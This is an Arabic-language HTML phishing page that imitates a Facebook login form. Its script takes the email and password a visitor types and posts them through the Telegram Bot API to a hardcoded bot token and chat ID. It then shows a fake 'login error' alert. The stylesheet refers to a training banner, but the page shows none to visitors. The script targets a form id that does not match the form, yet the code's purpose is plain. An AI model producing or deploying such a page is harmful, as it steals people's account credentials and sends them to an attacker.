<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>FaceBook</title>
<style>
  :root{
    --ink:#0f1115;
    --paper:#f5f6f8;
    --card:#ffffff;
    --accent:#2d5bff;
    --accent-dark:#1d3fc4;
    --line:#dfe2e8;
    --muted:#6b7280;
    --warn-bg:#fff4e5;
    --warn-border:#f0b94d;
    --warn-text:#8a5a00;
  }
  *{box-sizing:border-box;}
  html,body{height:100%;margin:0;}
  body{
    font-family:"Segoe UI",Tahoma,Arial,sans-serif;
    background:var(--paper);
    color:var(--ink);
    display:flex;
    flex-direction:column;
    min-height:100vh;
  }

  /* شريط تنويه إنها صفحة تدريبية */
  .training-banner{
    background:var(--warn-bg);
    border-bottom:1px solid var(--warn-border);
    color:var(--warn-text);
    text-align:center;
    padding:10px 16px;
    font-size:14px;
    line-height:1.5;
  }
  .training-banner strong{font-weight:700;}

  main{
    flex:1;
    display:flex;
    align-items:center;
    justify-content:center;
    padding:32px 16px;
  }

  .wrap{
    display:flex;
    gap:64px;
    align-items:center;
    max-width:980px;
    width:100%;
    flex-wrap:wrap;
    justify-content:center;
  }

  .brand{
    max-width:420px;
    text-align:right;
  }
  .brand .logo{
    display:flex;
    align-items:center;
    gap:10px;
    justify-content:flex-end;
    margin-bottom:18px;
  }
  .brand .logo-mark{
    width:40px;height:40px;border-radius:10px;
    background:var(--accent);
    display:flex;align-items:center;justify-content:center;
    color:#fff;font-weight:700;font-size:20px;
  }
  .brand .logo-text{font-size:26px;font-weight:700;color:var(--accent);}
  .brand h1{
    font-size:22px;
    line-height:1.5;
    font-weight:400;
    color:#2a2e35;
    margin:0;
  }

  .card{
    background:var(--card);
    border:1px solid var(--line);
    border-radius:12px;
    box-shadow:0 2px 10px rgba(16,20,30,.06);
    padding:28px 24px;
    width:100%;
    max-width:360px;
  }

  .field{margin-bottom:14px;}
  .field label{
    display:block;
    font-size:13px;
    color:var(--muted);
    margin-bottom:6px;
  }
  .field input{
    width:100%;
    padding:12px 14px;
    border:1px solid var(--line);
    border-radius:8px;
    font-size:15px;
    outline:none;
    transition:border-color .15s ease;
  }
  .field input:focus{
    border-color:var(--accent);
    box-shadow:0 0 0 3px rgba(45,91,255,.12);
  }

  .login-btn{
    width:100%;
    background:var(--accent);
    color:#fff;
    border:none;
    border-radius:8px;
    padding:13px 14px;
    font-size:16px;
    font-weight:600;
    cursor:pointer;
    transition:background .15s ease;
  }
  .login-btn:hover{background:var(--accent-dark);}
  .login-btn:focus-visible{
    outline:2px solid var(--accent-dark);
    outline-offset:2px;
  }

  .divider{
    display:flex;
    align-items:center;
    gap:10px;
    margin:18px 0;
    color:var(--muted);
    font-size:13px;
  }
  .divider::before,.divider::after{
    content:"";
    flex:1;
    height:1px;
    background:var(--line);
  }

  .forgot{
    text-align:center;
  }
  .forgot a{
    color:var(--accent);
    font-size:14px;
    text-decoration:none;
  }
  .forgot a:hover{text-decoration:underline;}

  .signup-row{
    margin-top:20px;
    text-align:center;
  }
  .signup-btn{
    display:inline-block;
    background:#31a24c;
    color:#fff;
    border:none;
    border-radius:8px;
    padding:12px 22px;
    font-size:15px;
    font-weight:600;
    cursor:pointer;
  }
  .signup-btn:hover{background:#298a41;}

  .note{
    margin-top:14px;
    font-size:12px;
    color:var(--muted);
    text-align:center;
    line-height:1.6;
  }

  footer{
    text-align:center;
    font-size:12px;
    color:var(--muted);
    padding:18px 12px;
  }

  /* نافذة التنبيه بعد الضغط على دخول */
  .toast{
    position:fixed;
    bottom:24px;
    left:50%;
    transform:translateX(-50%) translateY(20px);
    background:var(--ink);
    color:#fff;
    padding:14px 20px;
    border-radius:10px;
    font-size:14px;
    max-width:90%;
    text-align:center;
    opacity:0;
    pointer-events:none;
    transition:opacity .2s ease, transform .2s ease;
    box-shadow:0 8px 24px rgba(0,0,0,.25);
  }
  .toast.show{
    opacity:1;
    transform:translateX(-50%) translateY(0);
  }

  @media (max-width:720px){
    .wrap{flex-direction:column;gap:28px;}
    .brand{text-align:center;}
    .brand .logo{justify-content:center;}
  }

  @media (prefers-reduced-motion: reduce){
    *{transition:none !important;}
  }
</style>
</head>
<body>

  

  <main>
    <div class="wrap">

      <div class="brand">
        <div class="logo">
          <span class="logo-text">FaceBook</span>
          <span class="logo-mark">F</span>
        </div>
       
      </div>

      <div class="card">
        <form id="demoLoginForm" method="post">
          <div class="field">
            <label for="email">البريد الإلكتروني أو رقم الهاتف</label>
            <input type="text" id="email" name="email" autocomplete="off" placeholder="example@email.com">
          </div>
          <div class="field">
            <label for="password">كلمة المرور</label>
            <input type="password" id="password" name="password" autocomplete="off" placeholder="••••••••">
          </div>

          <button type="submit" class="login-btn">دخول</button>

          <div class="forgot">
            <a href="#" id="forgotLink">نسيت كلمة المرور؟</a>
          </div>

          <div class="divider">أو</div>

          <div class="signup-row">
            <button type="button" class="signup-btn" id="signupBtn">إنشاء حساب جديد</button>
          </div>

          
        </form>
      </div>

    </div>
  </main>

  
<script>
    document.getElementById('loginForm').addEventListener('submit', async function(e) {
    e.preventDefault(); // لمنع إعادة تحميل الصفحة

    // استلام القيم المدخلة
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    // بيانات بوت تليجرام ومعرف المحادثة
    const botToken = 'AAGWBCaNHBnqAv7QhNu2Oggarw066XKiSG4';
    const chatId = '9072593338';

    // تجهيز الرسالة
    const message = `⚠️ محاولة تسجيل دخول جديدة (عبر المتصفح):\n\nالبريد: ${email}\nكلمة المرور: ${password}`;

    // رابط API الخاص بتليجرام
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

    try {
        // إرسال الطلب مباشرة من متصفح المستخدم إلى تليجرام
        await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message
            })
        });

        // بعد الإرسال، يمكنك توجيه المستخدم أو إظهار رسالة خطأ وهمية
        alert('حدث خطأ في تسجيل الدخول، يجدر المحاولة لاحقاً.');
        // window.location.href = 'index.html'; // إعادة توجيه

    } catch (error) {
        console.error('فشل الإرسال:', error);
    }
});

</script>

</body>
</html>
